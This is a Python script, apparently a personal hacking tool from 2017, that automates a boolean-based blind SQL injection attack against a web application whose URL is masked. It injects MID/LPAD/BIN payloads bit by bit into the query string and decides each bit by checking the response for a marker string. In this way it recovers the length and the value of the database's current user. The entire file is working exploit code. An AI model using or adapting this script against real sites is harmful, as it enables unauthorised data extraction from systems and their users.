# -*- coding: utf-8 -*-
# @Time    : 2017/9/26 上午4:08
# @Author  : 逍遥哥哥
# @Email   : hellocatmao@gmail.com
# @File    : Main.py
# @Software: PyCharm

import requests
import time
from bs4 import BeautifulSoup

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"}
url = "http://www.zzzzzzz.cn/Home/Centre/details?cid=36"
duibi = "zzzzzzzz"

def Demo():



    response = requests.get(url, headers=headers, timeout=20)
    if Judge_State(response.text) == "正常":
        print("正常")

    else:
        print("非正常")
    #
    #
    # result = ''
    #
    # if response.text.find(duibi) != -1:
    #     result = '正常'
    #     return result
    # else:
    #     result = '非正常'
    #     return result


def Judge_State(Content):
    if Content.find(duibi) != -1:
        result = '正常'
        return result
    else:
        result = '非正常'
        return result
    pass


def Get_Length(query):

    PAYLOAD = "AND LENGTH(LENGTH(" + query + "))"

    f_width = 0

    for i in range(1, 4):
        attack_url = url + "') " + PAYLOAD + "=" + str(i) + " %23"
        response = requests.get(attack_url, headers=headers, timeout=20)
        print(response.request.url)
        if response.text.find(duibi) != -1:
            result = '正常'
            f_width = i
            break
        time.sleep(5)


    print("宽度为：", f_width)


    PAYLOAD1 = "AND MID(LPAD(BIN(MID(LENGTH(" + query + "),"


    result_len = ''         #记录最后的长度(十进制结果)

    for i in range(1, f_width+1):
        # response = requests.get(attack_url, headers=headers)
        # if response.text.find(duibi) != -1:
        #     result = '正常'
        #     f_len = f_len + "0"
        # else:
        #     f_len = f_len + "1"
        # time.sleep(5)
        temp = ''
        for t in range(1, 9):

            PAYLOAD2 = ",1)),8,0)," + str(t) +",1)=0"
            attack_url = url + "') " + PAYLOAD1 + str(i) + PAYLOAD2 + " %23"
            response = requests.get(attack_url, headers=headers, timeout=20)
            print(response.request.url)
            if Judge_State(response.text) == "正常":
                temp = temp + str(0)
                print("正常")
            else:
                temp = temp + str(1)
                print("非正常")
            time.sleep(3)
        print(temp)
        int_len = int(temp, base=2)

        result_len = result_len + str(int_len)
    print("数据长度为:", result_len)
    return result_len

def Get_Data(query ,length):
    PAYLOAD = "AND MID(LPAD(BIN(ORD(MID(" + query
    temp = ''       #用于记录二进制字符
    result_str = ''    #用于保存最后的结果字符串
    length = int(length)
    for i in range (1, length+1):
        PAYLOAD1 = PAYLOAD + "," + str(i) + ",1))),8,0),"
        temp = ''
        for t in range(1, 9):
            PAYLOAD2 = PAYLOAD1 + str(t) + ",1)=0"
            attack_url = url + "') " + PAYLOAD2 + " %23"
            response = requests.get(attack_url, headers=headers, timeout=20)
            if Judge_State(response.text) == "正常":
                temp = temp + str(0)
            else:
                temp = temp + str(1)
            time.sleep(3)
        temp = int(temp, base=2)    #二进制数据转换为十进制的ASCII码
        temp = chr(temp)            #ASCII码转字符
        print('第', i, '个字符:', temp)
        result_str = result_str + temp

    return result_str




def Main():
    query = "USER()"
    length = Get_Length(query)
    Get_Data(query, length)
    pass

if __name__ == '__main__':
    print(Main())
    #print(Get_Data("VERSION()", 10))
    #print(Demo())